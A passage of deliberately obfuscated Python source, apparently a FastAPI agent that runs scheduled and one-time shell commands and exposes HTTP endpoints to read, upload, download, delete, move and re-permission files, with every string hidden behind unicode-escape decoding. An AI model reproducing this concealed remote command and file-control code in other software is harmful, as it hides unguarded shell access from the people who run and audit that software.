                O0_var_814 = self._format_log_entry(O0_var_809, O0_var_812, O0_var_813, codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'))
                Config.onetimetasks_log = self._append_task_log(Config.onetimetasks_log, O0_var_814, self.max_log_size)
                O0_var_806.append({codecs.decode('\\u0069\\u006e\\u0064\\u0065\\u0078', 'unicode_escape'): O0_var_808, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_809[:200], codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_813, codecs.decode('\\u006f\\u0075\\u0074\\u0070\\u0075\\u0074', 'unicode_escape'): O0_var_812, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape')})
        Config.InitTask = False
        if Config.DEBUG:
            Logger.debug(codecs.decode('\\u2705\\u0020\\u005b\\u004f\\u006e\\u0065\\u0054\\u0069\\u006d\\u0065\\u005d\\u0020\\u0043\\u006f\\u006d\\u0070\\u006c\\u0065\\u0074\\u0065\\u0064\\u0020', 'unicode_escape') + str(len(O0_var_806)) + codecs.decode('\\u0020\\u0074\\u0061\\u0073\\u006b\\u0073\\u002c\\u0020\\u006c\\u006f\\u0067\\u0067\\u0065\\u0064\\u0020\\u0074\\u006f\\u0020\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065\\u0074\\u0061\\u0073\\u006b\\u0073\\u005f\\u006c\\u006f\\u0067', 'unicode_escape'))
        return O0_var_806

    async def _check_and_run_cron(self):
        if not Config.crontasks:
            return
        O0_var_815 = datetime.now()
        for O0_var_816, O0_var_817 in Config.crontasks.items():
            try:
                O0_var_818 = croniter(O0_var_816, O0_var_815)
                O0_var_819 = O0_var_818.get_prev(datetime)
                O0_var_820 = (O0_var_815 - O0_var_819).total_seconds()
                if 0 <= O0_var_820 <= self.check_interval + 5:
                    O0_var_821 = O0_var_819.strftime(codecs.decode('\\u0025\\u0059\\u0025\\u006d\\u0025\\u0064\\u0025\\u0048\\u0025\\u004d', 'unicode_escape'))
                    O0_var_822 = str(O0_var_816) + codecs.decode('\\u003a', 'unicode_escape') + str(O0_var_817) + codecs.decode('\\u003a', 'unicode_escape') + str(O0_var_821)
                    O0_var_823 = hashlib.md5(O0_var_822.encode()).hexdigest()[:10]
                    if O0_var_823 in self._executed_crons:
                        continue
                    if Config.DEBUG:
                        Logger.info(codecs.decode('\\u23f0\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u0054\\u0072\\u0069\\u0067\\u0067\\u0065\\u0072\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(O0_var_816) + codecs.decode('\\u0020\\u2192\\u0020', 'unicode_escape') + str(O0_var_817[:50]) + codecs.decode('\\u002e\\u002e\\u002e\\u0020\\u0028\\u004c\\u0061\\u0067\\u003a\\u0020', 'unicode_escape') + format(O0_var_820, codecs.decode('\\u002e\\u0032\\u0066', 'unicode_escape')) + codecs.decode('\\u0073\\u0029', 'unicode_escape'))
                    O0_var_824 = await asyncio.create_subprocess_shell(O0_var_817, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT, stdin=asyncio.subprocess.DEVNULL)
                    try:
                        O0_var_825, O0_var_826 = await asyncio.wait_for(O0_var_824.communicate(), timeout=self.timeout)
                        O0_var_827 = O0_var_825.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), errors=codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))[:2000]
                        O0_var_828 = O0_var_824.returncode
                    except asyncio.TimeoutError:
                        try:
                            O0_var_824.kill()
                        except:
                            pass
                        O0_var_827 = codecs.decode('\\u005b\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054\\u005d', 'unicode_escape')
                        O0_var_828 = 124
                    except Exception as inner_e:
                        O0_var_827 = codecs.decode('\\u005b\\u0052\\u0055\\u004e\\u0054\\u0049\\u004d\\u0045\\u005f\\u0045\\u0052\\u0052\\u004f\\u0052\\u005d\\u0020', 'unicode_escape') + str(str(inner_e))
                        O0_var_828 = -1
                    O0_var_829 = self._format_log_entry(O0_var_817, O0_var_827, O0_var_828, codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), O0_var_816)
                    Config.crontasks_log = self._append_task_log(Config.crontasks_log, O0_var_829, self.max_log_size)
                    self._executed_crons.add(O0_var_823)
                    asyncio.get_event_loop().call_later(120, self._executed_crons.discard, O0_var_823)
            except Exception as e:
                if Config.DEBUG:
                    Logger.error(codecs.decode('\\u274c\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u0053\\u0063\\u0068\\u0065\\u0064\\u0075\\u006c\\u0065\\u0072\\u0020\\u0045\\u0072\\u0072\\u006f\\u0072\\u0020\\u0066\\u006f\\u0072\\u0020\\u0027', 'unicode_escape') + str(O0_var_816) + codecs.decode('\\u0027\\u003a\\u0020', 'unicode_escape') + str(e))
                O0_var_827 = codecs.decode('\\u005b\\u0053\\u0043\\u0048\\u0045\\u0044\\u0055\\u004c\\u0045\\u0052\\u005f\\u0045\\u0052\\u0052\\u004f\\u0052\\u005d\\u0020', 'unicode_escape') + str(type(e).__name__) + codecs.decode('\\u003a\\u0020', 'unicode_escape') + str(str(e))
                O0_var_829 = self._format_log_entry(O0_var_817, O0_var_827, -1, codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), O0_var_816)
                Config.crontasks_log = self._append_task_log(Config.crontasks_log, O0_var_829, self.max_log_size)

    def get_onetime_log(self, O0_var_830: int=None) -> list:
        O0_var_831 = list(Config.onetimetasks_log)
        if O0_var_830 and O0_var_830 > 0:
            return O0_var_831[-O0_var_830:]
        return O0_var_831

    def get_cron_log(self, O0_var_832: int=None) -> list:
        O0_var_833 = list(Config.crontasks_log)
        if O0_var_832 and O0_var_832 > 0:
            return O0_var_833[-O0_var_832:]
        return O0_var_833

    def clear_logs(self, O0_var_834: str=codecs.decode('\\u0061\\u006c\\u006c', 'unicode_escape')):
        if O0_var_834 in [codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), codecs.decode('\\u0061\\u006c\\u006c', 'unicode_escape')]:
            Config.onetimetasks_log.clear()
        if O0_var_834 in [codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0061\\u006c\\u006c', 'unicode_escape')]:
            Config.crontasks_log.clear()
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006c\\u0065\\u0061\\u0072\\u0065\\u0064', 'unicode_escape'): O0_var_834}

    def set_cron_tasks(self, O0_var_835: Dict[str, str]) -> dict:
        O0_var_836 = []
        for O0_var_837 in O0_var_835.keys():
            try:
                croniter(O0_var_837, datetime.now())
            except Exception:
                O0_var_836.append(O0_var_837)
        if O0_var_836:
            return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0063\\u0072\\u006f\\u006e\\u0020\\u0065\\u0078\\u0070\\u0072\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e\\u0073\\u003a\\u0020', 'unicode_escape') + str(O0_var_836), codecs.decode('\\u0076\\u0061\\u006c\\u0069\\u0064\\u005f\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_835) - len(O0_var_836)}
        Config.crontasks = O0_var_835 if O0_var_835 else {}
        if Config.crontasks and (not Config.cronloop):
            self.start_cron_loop()
        elif not Config.crontasks and Config.cronloop:
            self.stop_cron_loop()
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.crontasks), codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): Config.crontasks}

    def get_cron_tasks(self) -> dict:
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.crontasks), codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): Config.crontasks}

    def start_cron_loop(self):
        if Config.cronloop and self._running:
            return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0043\\u0072\\u006f\\u006e\\u0020\\u006c\\u006f\\u006f\\u0070\\u0020\\u0061\\u006c\\u0072\\u0065\\u0061\\u0064\\u0079\\u0020\\u0072\\u0075\\u006e\\u006e\\u0069\\u006e\\u0067', 'unicode_escape')}
        Config.cronloop = True
        self._running = True
        self._executed_crons.clear()
        try:
            O0_var_838 = asyncio.get_event_loop()
            self._cron_task = O0_var_838.create_task(self._cron_loop_worker())
            if Config.DEBUG:
                Logger.info(codecs.decode('\\U0001f504\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u004c\\u006f\\u006f\\u0070\\u0020\\u0073\\u0074\\u0061\\u0072\\u0074\\u0065\\u0064\\u002c\\u0020\\u0069\\u006e\\u0074\\u0065\\u0072\\u0076\\u0061\\u006c\\u003d', 'unicode_escape') + str(self.check_interval) + codecs.decode('\\u0073', 'unicode_escape'))
        except RuntimeError:
            import threading
            O0_var_839 = threading.Thread(target=self._run_cron_sync, daemon=True)
            O0_var_839.start()
            if Config.DEBUG:
                Logger.info(codecs.decode('\\U0001f504\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u004c\\u006f\\u006f\\u0070\\u0020\\u0073\\u0074\\u0061\\u0072\\u0074\\u0065\\u0064\\u0020\\u0069\\u006e\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u002c\\u0020\\u0069\\u006e\\u0074\\u0065\\u0072\\u0076\\u0061\\u006c\\u003d', 'unicode_escape') + str(self.check_interval) + codecs.decode('\\u0073', 'unicode_escape'))
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0043\\u0072\\u006f\\u006e\\u0020\\u006c\\u006f\\u006f\\u0070\\u0020\\u0073\\u0074\\u0061\\u0072\\u0074\\u0065\\u0064', 'unicode_escape')}

    def stop_cron_loop(self):
        Config.cronloop = False
        self._running = False
        if self._cron_task:
            self._cron_task.cancel()
            self._cron_task = None
        if Config.DEBUG:
            Logger.info(codecs.decode('\\U0001f6d1\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u004c\\u006f\\u006f\\u0070\\u0020\\u0073\\u0074\\u006f\\u0070\\u0070\\u0065\\u0064', 'unicode_escape'))
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0043\\u0072\\u006f\\u006e\\u0020\\u006c\\u006f\\u006f\\u0070\\u0020\\u0073\\u0074\\u006f\\u0070\\u0070\\u0065\\u0064', 'unicode_escape')}

    async def _cron_loop_worker(self):
        while self._running and Config.cronloop:
            try:
                await self._check_and_run_cron()
            except Exception as e:
                if Config.DEBUG:
                    Logger.error(codecs.decode('\\u274c\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u004c\\u006f\\u006f\\u0070\\u0020\\u0065\\u0072\\u0072\\u006f\\u0072\\u003a\\u0020', 'unicode_escape') + str(e))
            await asyncio.sleep(self.check_interval)

    def _run_cron_sync(self):
        import time
        while self._running and Config.cronloop:
            try:
                asyncio.run(self._check_and_run_cron())
            except:
                pass
            time.sleep(self.check_interval)

    @staticmethod
    def _append_task_log(log_list: deque, entry: dict, max_size: int=None):
        if max_size is None:
            max_size = Config.MAX_TASK_LOG_SIZE
        if not isinstance(log_list, deque):
            log_list = deque(log_list, maxlen=max_size)
        log_list.append(entry)
        return log_list

    @staticmethod
    def _format_log_entry(cmd: str, output: str, exitcode: int, task_type: str, cron_expr: str=None) -> dict:
        return {codecs.decode('\\u0074\\u0073', 'unicode_escape'): datetime.utcnow().isoformat() + codecs.decode('\\u005a', 'unicode_escape'), codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): cmd, codecs.decode('\\u006f\\u0075\\u0074\\u0070\\u0075\\u0074', 'unicode_escape'): output, codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): exitcode, codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): task_type, codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'): cron_expr, codecs.decode('\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0074\\u0065\\u0064', 'unicode_escape'): str(datetime.utcnow().isoformat()) + codecs.decode('\\u005a\\u0020\\u002d\\u002d\\u002d\\u002d\\u0020', 'unicode_escape') + str(cmd) + codecs.decode('\\u0020\\u002d\\u002d\\u002d\\u002d\\u0020\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065\\u003d', 'unicode_escape') + str(exitcode) + codecs.decode('\\u000a', 'unicode_escape') + str(output.strip())}

    def get_status(self) -> dict:
        return {codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'): {codecs.decode('\\u0070\\u0065\\u006e\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'): Config.InitTask and len(Config.onetasks) > 0, codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.onetasks)}, codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'): {codecs.decode('\\u0061\\u0063\\u0074\\u0069\\u0076\\u0065', 'unicode_escape'): Config.cronloop, codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.crontasks), codecs.decode('\\u0063\\u0068\\u0065\\u0063\\u006b\\u005f\\u0069\\u006e\\u0074\\u0065\\u0072\\u0076\\u0061\\u006c', 'unicode_escape'): self.check_interval}}

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u006c\\u0069\\u0073\\u0074', 'unicode_escape'), response_model=FileListResponse)
async def O0_fn_32(request: Request, body: FileListRequest=Body(...)):
    O0_var_840 = request.app.state.file_manager
    O0_var_841 = O0_var_840.list_files(base_path=body.path, recursive=body.recursive)
    return O0_var_841

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), response_model=AuthorityQueryResponse)
async def O0_fn_33(request: Request, body: AuthorityQueryRequest=Body(...)):
    if not body.paths:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073\\u003a', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u0073', 'unicode_escape'): []})
    O0_var_842 = request.app.state.file_manager
    O0_var_843 = O0_var_842.get_authority(body.paths)
    return O0_var_843

@app.put(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), response_model=AuthoritySetResponse)
async def O0_fn_34(request: Request, body: AuthoritySetRequest=Body(...)):
    O0_var_844 = body.permissions
    O0_var_845 = body.recursive
    if not O0_var_844:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): 0, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): []})
    O0_var_846 = request.app.state.file_manager
    O0_var_847 = O0_var_846.set_authority(O0_var_844, O0_var_845)
    return O0_var_847

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0063\\u0061\\u0074', 'unicode_escape'), response_model=FileCatResponse)
async def O0_fn_35(request: Request, body: FileCatRequest=Body(...)):
    if not body.path:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u0069\\u0073\\u005f\\u0062\\u0069\\u006e\\u0061\\u0072\\u0079', 'unicode_escape'): False, codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): 0})
    O0_var_848 = request.app.state.file_manager
    O0_var_849 = O0_var_848.cat_file(body.path)
    return O0_var_849

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065', 'unicode_escape'), response_model=FileUploadResponse)
async def O0_fn_36(request: Request, body: FileUploadRequest=Body(...)):
    if not body.content:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u0020\\u0028\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u0029\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): None, codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064', 'unicode_escape'): None, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): None, codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape'): None})
    try:
        O0_var_850 = base64.b64decode(body.content)
    except Exception:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u0020\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): None, codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064', 'unicode_escape'): None, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): None, codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape'): None})
    O0_var_851 = request.app.state.file_manager
    O0_var_852 = O0_var_851.upload_file(file_content=O0_var_850, target_path=body.path, filename=body.filename, chunk_id=body.chunk_id, total_chunks=body.total_chunks)
    return O0_var_852

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u0072\\u0061\\u0077', 'unicode_escape'), response_model=FileUploadRawResponse)
async def O0_fn_37(request: Request):
    O0_var_853 = request.headers
    O0_var_854 = unquote(O0_var_853.get(codecs.decode('\\u0058\\u002d\\u0046\\u0069\\u006c\\u0065\\u002d\\u0050\\u0061\\u0074\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')))
    O0_var_855 = unquote(O0_var_853.get(codecs.decode('\\u0058\\u002d\\u0046\\u0069\\u006c\\u0065\\u002d\\u004e\\u0061\\u006d\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')))
    O0_var_856 = O0_var_853.get(codecs.decode('\\u0058\\u002d\\u0043\\u0068\\u0075\\u006e\\u006b\\u002d\\u0049\\u0064', 'unicode_escape'))
    O0_var_857 = O0_var_853.get(codecs.decode('\\u0058\\u002d\\u0054\\u006f\\u0074\\u0061\\u006c\\u002d\\u0043\\u0068\\u0075\\u006e\\u006b\\u0073', 'unicode_escape'))
    if not O0_var_854 or not O0_var_855:
        raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=codecs.decode('\\u004d\\u0069\\u0073\\u0073\\u0069\\u006e\\u0067\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064\\u0020\\u0063\\u0075\\u0073\\u0074\\u006f\\u006d\\u0020\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073\\u003a\\u0020\\u0058\\u002d\\u0046\\u0069\\u006c\\u0065\\u002d\\u0050\\u0061\\u0074\\u0068\\u0020\\u0061\\u006e\\u0064\\u0020\\u0058\\u002d\\u0046\\u0069\\u006c\\u0065\\u002d\\u004e\\u0061\\u006d\\u0065', 'unicode_escape'))
    O0_var_858 = int(O0_var_856) if O0_var_856 is not None else None
    O0_var_859 = int(O0_var_857) if O0_var_857 is not None else None
    O0_var_860 = await request.body()
    O0_var_861 = request.app.state.file_manager
    O0_var_862 = O0_var_861.upload_file(file_content=O0_var_860, target_path=O0_var_854, filename=O0_var_855, chunk_id=O0_var_858, total_chunks=O0_var_859)
    if O0_var_862.get(codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')) == codecs.decode('\\u006f\\u006b', 'unicode_escape'):
        return FileUploadRawResponse(status=codecs.decode('\\u006f\\u006b', 'unicode_escape'), path=O0_var_862.get(codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')), chunk_id=O0_var_858, completed=True, message=codecs.decode('\\u0041\\u006c\\u006c\\u0020\\u0063\\u0068\\u0075\\u006e\\u006b\\u0073\\u0020\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064\\u002e\\u0020\\u0046\\u0069\\u006c\\u0065\\u0020\\u006d\\u0065\\u0072\\u0067\\u0065\\u0064\\u0020\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073\\u0066\\u0075\\u006c\\u006c\\u0079\\u002e', 'unicode_escape') if O0_var_862.get(codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape')) else codecs.decode('\\u0046\\u0069\\u006c\\u0065\\u0020\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064\\u0065\\u0064\\u0020\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073\\u0066\\u0075\\u006c\\u006c\\u0079\\u002e', 'unicode_escape'))
    elif O0_var_862.get(codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')) == codecs.decode('\\u0070\\u0065\\u006e\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'):
        return FileUploadRawResponse(status=codecs.decode('\\u006f\\u006b', 'unicode_escape'), path=os.path.join(O0_var_854, O0_var_855), chunk_id=O0_var_858, completed=False, message=codecs.decode('\\u0043\\u0068\\u0075\\u006e\\u006b\\u0020', 'unicode_escape') + str(O0_var_858) + codecs.decode('\\u0020\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064\\u0065\\u0064\\u002e\\u0020\\u0057\\u0061\\u0069\\u0074\\u0069\\u006e\\u0067\\u0020\\u0066\\u006f\\u0072\\u0020\\u0072\\u0065\\u006d\\u0061\\u0069\\u006e\\u0069\\u006e\\u0067\\u0020\\u0062\\u006c\\u006f\\u0063\\u006b\\u0073\\u002e', 'unicode_escape'))
    return FileUploadRawResponse(status=codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), completed=False, message=O0_var_862.get(codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'), codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e\\u0020\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064\\u0020\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape')))

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0064\\u006f\\u0077\\u006e\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'))
async def O0_fn_38(request: Request, body: FileDownloadRequest=Body(...)):
    if not body.path:
        return JSONResponse(400, {codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape')})
    O0_var_863 = request.app.state.file_manager
    O0_var_864, O0_var_865, O0_var_866 = O0_var_863.download_file(body.path)
    from fastapi.responses import FileResponse
    return FileResponse(path=str(O0_var_864), filename=O0_var_864.name, media_type=O0_var_865, headers={codecs.decode('\\u0078\\u002d\\u0066\\u0069\\u006c\\u0065\\u002d\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): str(O0_var_866), codecs.decode('\\u0078\\u002d\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0061\\u006c\\u002d\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_864.relative_to(Path(Config.FILE_ROOT)))})

@app.delete(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065', 'unicode_escape'), response_model=FileDeleteResponse)
async def O0_fn_39(request: Request, body: FileDeleteRequest=Body(...)):
    O0_var_867 = body.paths
    if not O0_var_867:
        O0_var_868 = await request.body()
        O0_var_869 = json.loads(O0_var_868.decode()) if O0_var_868 else {}
        O0_var_867 = [O0_var_871 for O0_var_870 in [codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u0032', 'unicode_escape'), codecs.decode('\\u0070\\u0031', 'unicode_escape'), codecs.decode('\\u0070\\u0032', 'unicode_escape')] if (O0_var_871 := O0_var_869.get(O0_var_870))]
    if not O0_var_867:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): []})
    O0_var_872 = request.app.state.file_manager
    O0_var_873 = O0_var_872.delete_paths(O0_var_867)
    return O0_var_873

@app.put(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065', 'unicode_escape'), response_model=FileMoveResponse)
async def O0_fn_40(request: Request, move_map: Dict[str, str]=Body(..., examples={codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'): codecs.decode('\\u002f\\u0061\\u0072\\u0063\\u0068\\u0069\\u0076\\u0065\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape')})):
    if not move_map:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0041\\u0074\\u0020\\u006c\\u0065\\u0061\\u0073\\u0074\\u0020\\u006f\\u006e\\u0065\\u0020\\u0073\\u0072\\u0063\\u002d\\u003e\\u0064\\u0073\\u0074\\u0020\\u0070\\u0061\\u0069\\u0072\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape')})
    O0_var_874 = request.app.state.file_manager
    O0_var_875 = O0_var_874.move_paths(move_map)
    return O0_var_875

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0063\\u0070', 'unicode_escape'), response_model=FileMoveResponse)
